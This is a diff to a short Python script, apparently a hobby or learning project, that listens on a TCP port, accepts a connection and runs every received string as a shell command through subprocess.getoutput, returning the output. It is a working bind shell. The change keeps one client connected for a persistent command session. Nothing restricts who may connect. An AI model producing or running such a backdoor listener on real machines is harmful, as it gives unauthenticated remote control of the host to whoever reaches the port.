@@ -10,16 +10,15 @@ def listen_on_socket(target_ip, target_port):
     tcp_server.listen(5)
 
     print(f"Listening on {socket.gethostname()} : {target_port}")
+    client_socket, client_address = tcp_server.accept()
+    print(f"Connection from {client_address} has been Established")
+    client_socket.send(bytes("Connection Established", "utf-8"))
 
     while True:
-        client_socket, client_address = tcp_server.accept()
-        print(f"Connection from {client_address} has been Established")
-        client_socket.send(bytes("Connection Established", "utf-8"))
         recieved_data = client_socket.recv(4096)
-
         command_output = subprocess.getoutput(recieved_data.decode("utf-8"))
         client_socket.send(bytes(command_output, "utf-8"))
-        
+    
 def main():
     try:
         my_target = sys.argv[1]
